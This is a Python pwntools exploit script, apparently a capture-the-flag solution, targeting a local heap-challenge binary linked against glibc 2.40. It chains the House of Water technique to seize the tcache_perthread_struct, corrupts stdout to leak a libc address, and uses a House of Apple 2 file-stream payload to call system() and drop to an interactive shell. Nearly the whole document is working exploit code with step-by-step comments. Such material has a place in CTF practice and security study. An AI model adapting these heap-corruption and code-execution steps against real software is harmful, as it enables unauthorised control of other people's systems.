#!/usr/bin/env python3

from pwn import *
import io_file

exe = ELF("./vuln_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.40.so", checksec=False)

context.binary = exe
global p, index
index = -1

def conn():
    r = process([exe.path])
    if args.GDB:
        gdb.attach(r,gdbscript='''

''')
        sleep(2)

    return r

def malloc(size):
    global index
    p.sendlineafter(b">",b"1")
    p.sendlineafter(b"Size?",str(size).encode())
    index += 1
    return index
    
def free(idx):
    p.sendlineafter(b">",b"2")
    p.sendlineafter(b"Index?",str(idx).encode())
    
def edit(idx,data,offset=0):
    p.sendlineafter(b">",b"3")
    p.sendlineafter(b"Index?",str(idx).encode())
    p.sendlineafter(b"Offset?\n> ",str(offset).encode())
    p.send(data)
    
def get_leak():
    p.sendlineafter(b">",b"4")
    p.readuntil(b'nibble of exit():')
    libc_leak = int(p.readline(),16)
    p.readuntil(b'nibble of heap:') # will hang if heap not initialized
    heap_leak = int(p.readline(),16)
    return libc_leak, heap_leak
    
def exit():
    p.sendlineafter(b">",b"5")

def main():
    global p
    p = conn()
    
    """
    Step 1: House of Water
    We will use the House of Water to leaklessly gain control
    of the tcache_perthread_struct.
    """
    
    for _ in range(7): # we will fill up the tcache with this later
        malloc(0x90-8) 
    
    middle = malloc(0x90-8) # 'middle' unsortedbin chunk


    playground = malloc(0x20 + 0x30 + 0x500 + (0x90-8)*2)
    guard = malloc(0x18) # guard 1 (at bottom of heap)
    free(playground) # cause UAF
    guard = malloc(0x18) # guard 2 (remaindered, right below the 8 0x90 chunks)
    
    # begin to remainder 'playground'
    corruptme = malloc(0x4c8)
    start_M = malloc(0x90-8) # start-0x10
    midguard = malloc(0x28) # prevent consolidation of start_M / end_M
    end_M = malloc(0x90-8) # end-0x10
    leftovers = malloc(0x28) # rest of unsortedbin chunk
        
    edit(playground,p64(0x651),0x18) # change size to what it was pre-consolidation
    free(corruptme)
    
    offset = malloc(0x4c8+0x10) # we offset by 0x10
    start = malloc(0x90-8) # start
    midguard = malloc(0x28)
    end = malloc(0x90-8) # end
    leftovers = malloc(0x18) # rest of unsortedbin chunk
    
    # move forward a bunch
    # we've taken 0xda0 bytes from the top chunk so far, and we want to control the data at
    # heap_base+0x10080 to provide our fake 0x10000 chunk a valid prev_size
    malloc((0x10000+0x80)-0xda0-0x18)
    fake_data = malloc(0x18)
    edit(fake_data,p64(0x10000)+p64(0x20)) # fake prev_size and size
    
    # now we create the fake size on the tcache_perthread_struct
    fake_size_lsb = malloc(0x3d8);
    fake_size_msb = malloc(0x3e8);
    free(fake_size_lsb)
    free(fake_size_msb)
    # now our fake chunk has a size of '0x10001'
    
    edit(playground,p64(0x31),0x4e8) # edit size of start_M from 0x91 to 0x31
    free(start_M) # now &start is in the 0x31 tcache bin
    edit(start_M,p64(0x91),8) # this corrupts start's metadata (because it's 0x10 bytes behind) so we repair its size
    
    # now we do the same to end_M, but we free it into the 0x21 bin instead
    edit(playground,p64(0x21),0x5a8)
    free(end_M)
    edit(end_M,p64(0x91),8)
    
    # now we fill up the 0x90 tcache
    for i in range(7):
        free(i)
    
    # create unsortedbin list
    free(end)
    free(middle)
    free(start)
    
    """
    Link 'fake' into the list.
    This requires a 4-bit bruteforce as we perform a 2-byte partial overwrite,
    and ASLR randomzies the upper 4 bits of those 2 bytes. To make this exploit
    script consistent, the program has a 'get_leak()' function which leaks those 4
    bits out to us.
    
    We need to perform a similar partial overwrite to get control of stdout, which
    needs another 4-bit bruteforce. This brings the bruteforce to 8 bits total, meaning
    this script would have a 1/256 chance working from a truly leakless perspective.
    """
    libc_leak, heap_leak = get_leak()
    edit(start,p16((heap_leak << 12) + 0x80))
    edit(end,p16((heap_leak << 12) + 0x80),8)
    
    exit_lsb = (libc_leak << 12) + (libc.sym['exit'] & 0xfff) # last 2 bytes of exit()
    stdout_offset = libc.sym['_IO_2_1_stdout_'] - libc.sym['exit'] # just relative offset, no libc leak yet
    stdout_lsb = (exit_lsb + stdout_offset) & 0xffff # last 2 bytes of stdout
    info(f"{stdout_lsb=:#x}")
    
    win = malloc(0x888) # tcache_perthread_struct control
    
    
    """
    Step 2: RCE
    We will first perform a partial overwrite of the stdout file stream
    to force it to leak out a libc pointer to us, then use the House of Apple 2
    to get RCE using FSOP.
    """
    
    edit(win,p16(stdout_lsb),8) # change 0x31 bin to point to stdout
    stdout = malloc(0x28)
    # force leak w/ _IO_write_base partial overwrite
    edit(stdout,p64(0xfbad3887)+p64(0)*3+p8(0)) 
    libc_leak = u64(p.recvn(8))
    libc.address = libc_leak - (libc.sym['_IO_2_1_stdout_']+132)
    info(f"{libc.address=:#x}")
    
    # prepare house of apple2 payload
    file = io_file.IO_FILE_plus_struct() 
    payload = file.house_of_apple2_execmd_when_do_IO_operation(
        libc.sym['_IO_2_1_stdout_'],
        libc.sym['_IO_wfile_jumps'],
        libc.sym['system'])
    # editing 60th bin (0x3e0) of tcache for full stdout control
    edit(win,p64(libc.sym['_IO_2_1_stdout_']),8*60)
    full_stdout = malloc(0x3e0-8)
    edit(full_stdout,payload)

    p.interactive() # PLIMB's up!


if __name__ == "__main__":
    main()
